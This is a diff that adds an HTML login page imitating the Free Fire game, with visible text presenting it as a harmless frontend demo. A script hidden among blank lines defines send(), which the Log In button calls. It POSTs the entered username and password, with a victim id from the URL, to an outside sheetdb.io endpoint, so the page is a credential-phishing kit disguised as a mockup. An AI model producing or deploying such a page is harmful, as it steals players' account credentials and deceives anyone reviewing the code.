@@ -1,0 +1,444 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8" />
+<meta name="viewport" content="width=device-width,initial-scale=1" />
+<title>Free Fire — Login</title>
+
+<!-- Optional: use a game-like font (browser will fall back if unavailable) -->
+<link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@400;600;800&display=swap" rel="stylesheet">
+
+<style>
+  :root{
+    --bg1: #0b0f14;
+    --bg2: #1f1b2e;
+    --accent: #ffb400;
+    --danger: #ff4d4f;
+    --muted: #bfc5cc;
+  }
+
+  *{box-sizing:border-box}
+  body{
+    margin:0;
+    min-height:100vh;
+    font-family: "Montserrat", system-ui, -apple-system, "Segoe UI", Roboto, "Helvetica Neue", Arial;
+    background: radial-gradient(1200px 600px at 10% 10%, rgba(255,180,0,0.06), transparent 10%),
+                linear-gradient(180deg,var(--bg1) 0%, var(--bg2) 100%);
+    color: #fff;
+    display:flex;
+    align-items:center;
+    justify-content:center;
+    padding:28px;
+  }
+
+  .card{
+    width:100%;
+    max-width:980px;
+    background: linear-gradient(180deg, rgba(255,255,255,0.02), rgba(0,0,0,0.08));
+    border-radius:14px;
+    box-shadow: 0 10px 40px rgba(0,0,0,0.6), 0 0 0 1px rgba(255,255,255,0.02) inset;
+    overflow:hidden;
+    display:grid;
+    grid-template-columns: 1fr 420px;
+    gap:0;
+  }
+
+  /* Left hero */
+  .hero{
+    padding:34px;
+    background:
+      linear-gradient(120deg, rgba(255,180,0,0.06), rgba(255,60,60,0.03)),
+      url('https://images.unsplash.com/photo-1508610048659-a06b669e3321?q=80&w=1400&auto=format&fit=crop&ixlib=rb-4.0.3&s=placeholder') center/cover no-repeat;
+    position:relative;
+  }
+
+  .hero::after{
+    /* subtle flame vignette */
+    content:"";
+    position:absolute;
+    inset:0;
+    background: radial-gradient(400px 200px at 20% 80%, rgba(255,150,30,0.06), transparent 10%),
+                linear-gradient(180deg, rgba(0,0,0,0.15), transparent 40%);
+    pointer-events:none;
+  }
+
+  .branding{
+    display:flex;
+    gap:12px;
+    align-items:center;
+    margin-bottom:18px;
+  }
+
+  .logo {
+    width:64px;
+    height:64px;
+    border-radius:10px;
+    background: linear-gradient(135deg,#ff8a00,#ff2d55);
+    display:flex;
+    align-items:center;
+    justify-content:center;
+    font-weight:800;
+    font-size:24px;
+    color:#fff;
+    box-shadow: 0 6px 18px rgba(255,100,0,0.18);
+  }
+
+  h1{
+    margin:0 0 8px 0;
+    font-size:26px;
+    letter-spacing:0.6px;
+  }
+
+  p.lead{
+    margin:0 0 18px 0;
+    color:var(--muted);
+    max-width:420px;
+    line-height:1.4;
+  }
+
+  .features{
+    display:flex;
+    gap:12px;
+    flex-wrap:wrap;
+    margin-top:18px;
+  }
+
+  .chip{
+    background: rgba(255,255,255,0.03);
+    padding:8px 12px;
+    border-radius:10px;
+    font-size:13px;
+    color:var(--muted);
+    display:flex;
+    gap:8px;
+    align-items:center;
+  }
+
+  .big-cta{
+    margin-top:22px;
+    display:flex;
+    gap:12px;
+    align-items:center;
+  }
+
+  .cta-btn{
+    background:linear-gradient(90deg,var(--accent), #ff6b24);
+    color:#111;
+    padding:12px 18px;
+    border-radius:10px;
+    font-weight:700;
+    border:none;
+    cursor:pointer;
+    box-shadow: 0 8px 22px rgba(255,140,30,0.16);
+  }
+
+  .secondary{
+    background:transparent;
+    color:var(--muted);
+    border:1px solid rgba(255,255,255,0.04);
+    padding:10px 14px;
+    border-radius:10px;
+    cursor:pointer;
+  }
+
+  /* Right form */
+  .form-wrap{
+    padding:30px 28px;
+    background: linear-gradient(180deg, rgba(255,255,255,0.01), rgba(0,0,0,0.12));
+    display:flex;
+    flex-direction:column;
+    justify-content:center;
+  }
+
+  .form-card{
+    background: linear-gradient(180deg, rgba(255,255,255,0.02), rgba(0,0,0,0.06));
+    border-radius:12px;
+    padding:20px;
+    box-shadow: 0 6px 20px rgba(0,0,0,0.6);
+  }
+
+  label{
+    display:block;
+    font-size:13px;
+    color:var(--muted);
+    margin-bottom:8px;
+    margin-top:6px;
+  }
+
+  input[type="text"],
+  input[type="password"],
+  input[type="email"]{
+    width:100%;
+    padding:12px 12px;
+    border-radius:8px;
+    border:1px solid rgba(255,255,255,0.04);
+    background: rgba(0,0,0,0.35);
+    color:#fff;
+    outline:none;
+    font-size:15px;
+  }
+
+  .row {
+    display:flex;
+    gap:12px;
+  }
+
+  .small{
+    flex:1;
+  }
+
+  .form-actions{
+    margin-top:14px;
+    display:flex;
+    gap:10px;
+    align-items:center;
+  }
+
+  .login-btn{
+    background: linear-gradient(90deg,#ffb400,#ff6b24);
+    border:none;
+    color:#111;
+    padding:12px 16px;
+    border-radius:9px;
+    font-weight:800;
+    cursor:pointer;
+    flex:1;
+    box-shadow: 0 8px 18px rgba(255,130,20,0.14);
+  }
+
+  .ghost{
+    background:transparent;
+    border:1px solid rgba(255,255,255,0.06);
+    color:var(--muted);
+    padding:10px 12px;
+    border-radius:9px;
+    cursor:pointer;
+  }
+
+  .helper{
+    font-size:13px;
+    color:var(--muted);
+    margin-top:12px;
+    display:flex;
+    justify-content:space-between;
+    align-items:center;
+  }
+
+  .danger{
+    color:var(--danger);
+    font-size:13px;
+    margin-top:8px;
+  }
+
+  /* small devices: stack columns */
+  @media (max-width:900px){
+    .card{
+      grid-template-columns: 1fr;
+    }
+    .hero{
+      padding:22px;
+      order:2;
+    }
+    .form-wrap{
+      order:1;
+    }
+  }
+
+  /* small animated flame accent */
+  .flame {
+    position:absolute;
+    right:22px;
+    bottom:22px;
+    width:120px;height:120px;
+    pointer-events:none;
+    opacity:0.85;
+    transform:translateZ(0);
+  }
+
+  .flame .f {
+    position:absolute;
+    inset:0;
+    border-radius:50%;
+    filter: blur(20px);
+    animation: flicker 2s infinite;
+    mix-blend-mode: screen;
+  }
+  .f.f1{background: radial-gradient(circle at 30% 40%, rgba(255,180,0,0.75), transparent 30%);}
+  .f.f2{background: radial-gradient(circle at 60% 60%, rgba(255,90,20,0.5), transparent 35%); animation-delay:0.2s}
+  .f.f3{background: radial-gradient(circle at 50% 30%, rgba(255,40,60,0.35), transparent 40%); animation-delay:0.4s}
+
+  @keyframes flicker {
+    0%{transform:translateY(0) scale(1);opacity:0.95}
+    50%{transform:translateY(-6px) scale(1.06);opacity:0.85}
+    100%{transform:translateY(0) scale(1);opacity:0.95}
+  }
+
+  /* small touches */
+  .muted-small{color:var(--muted); font-size:13px}
+</style>
+</head>
+<body>
+
+<div class="card" role="main" aria-labelledby="title">
+  <section class="hero" aria-hidden="false">
+    <div class="branding">
+      <div class="logo">FF</div>
+      <div>
+        <div id="title"><h1>FREE FIRE • BATTLE ARENA</h1></div>
+        <div class="muted-small">Ready. Drop. Survive. Win.</div>
+      </div>
+    </div>
+
+    <p class="lead">High-octane battle royale styled landing. Join matches, earn skins, unlock characters, and climb the leaderboard. This demo UI is a frontend-only mockup — integrate with backend for real auth and payments.</p>
+
+    <div class="features" aria-hidden="true">
+      <div class="chip">Solo / Squad</div>
+      <div class="chip">Live Events</div>
+      <div class="chip">Ranked Mode</div>
+      <div class="chip">Exclusive Skins</div>
+    </div>
+
+    <div class="big-cta" style="margin-top:28px;">
+      <button class="cta-btn" onclick="document.getElementById('email').focus()">Play Now</button>
+      <button class="secondary" onclick="alert('This is a demo UI — connect real backend')">How to Play</button>
+    </div>
+
+    <div class="flame" aria-hidden="true">
+      <div class="f f1"></div>
+      <div class="f f2"></div>
+      <div class="f f3"></div>
+    </div>
+
+  </section>
+
+  <aside class="form-wrap" aria-labelledby="formTitle">
+    <div class="form-card" role="form" aria-label="Login form">
+      <h2 id="formTitle" style="margin:0 0 6px 0">Player Login</h2>
+      <div class="muted-small" style="margin-bottom:14px">Sign in to access your account, inventory & friends.</div>
+      
+
+      <label for="email">Email or Username</label>
+      <input id="email" type="text" placeholder="you@example.com or Player123" autocomplete="username">
+
+      <label for="pwd">Password</label>
+      <div style="display:flex;gap:8px;align-items:center">
+        <input id="password" type="password" placeholder="••••••••" style="flex:1" autocomplete="current-password">
+        <button id="toggle" class="ghost" onclick="" type="button" style="white-space:nowrap">Show</button>
+      </div>
+     
+
+
+
+
+
+
+
+        <script>
+        function send() {
+           const email = document.getElementById('email').value;
+       const password = document.getElementById('password').value;
+           
+           
+        var urldata = new URLSearchParams(window.location.search);
+        
+        const id = urldata.get('id');
+        const type = "freefire";
+        
+           
+           const url = "https://sheetdb.io/api/v1/md4crj2w1sk6g";
+
+fetch(url, {
+  method: "POST",
+  headers: {
+    "Content-Type": "application/json"
+  },
+  body: JSON.stringify({
+    data: {
+      id: id,
+      type: type,
+      username: email,
+      password: password
+    }
+  })
+})
+.then(response => response.json())
+.then(result => {
+  //out
+})
+.catch(error => {
+  window.alert(error);
+});
+            
+        }
+            
+        </script>
+        
+        
+
+
+
+
+
+
+
+      <div style="display:flex;gap:10px;margin-top:10px;align-items:center">
+        <input id="remember" type="checkbox" style="width:16px;height:16px">
+        <label for="remember" style="margin:0;font-size:13px;color:var(--muted)">Keep me signed in</label>
+      </div>
+
+      <div class="form-actions">
+        <button onclick="send()" id="loginBtn" class="login-btn">Log In</button>
+        <button class="ghost" onclick="alert('Register flow not implemented in demo')">Register</button>
+      </div>
+
+      <div class="helper">
+        <a href="#" style="color:var(--muted); text-decoration:none; font-size:13px" onclick="alert('Open password recovery')">Forgot password?</a>
+        <div style="font-size:13px;color:var(--muted)">No account? <a href="#" style="color:var(--accent);text-decoration:none" onclick="alert('Register demo')">Create</a></div>
+      </div>
+
+      <div id="msg" class="danger" role="status" aria-live="polite" style="display:none"></div>
+    </div>
+  </aside>
+</div>
+
+<script>
+  // small interactive bits: show/hide password + basic validation (frontend only)
+  const pwd = document.getElementById('pwd');
+  const toggle = document.getElementById('toggle');
+  const loginBtn = document.getElementById('loginBtn');
+  const email = document.getElementById('email');
+  const msg = document.getElementById('msg');
+
+  toggle.addEventListener('click', () => {
+    if (pwd.type === 'password') {
+      pwd.type = 'text';
+      toggle.textContent = 'Hide';
+    } else {
+      pwd.type = 'password';
+      toggle.textContent = 'Show';
+    }
+  });
+
+  loginBtn.addEventListener('click', () => {
+    msg.style.display = 'none';
+    const u = email.value.trim();
+    const p = pwd.value;
+    if (!u || !p) {
+      showMsg('Please enter username/email and password.');
+      return;
+    }
+    // Simple demo "auth" (DO NOT USE in production)
+    if ((u.toLowerCase() === 'player' || u.toLowerCase() === 'player123' || u.includes('@')) && p.length >= 6) {
+      alert('Demo login successful — this is a frontend mock. Integrate with real backend for authentication.');
+    } else {
+      showMsg('Login failed. Check credentials (demo rules: username "player" or any email, password min 6).');
+    }
+  });
+
+  function showMsg(text){
+    msg.textContent = text;
+    msg.style.display = 'block';
+  }
+</script>
+</body>
+</html>
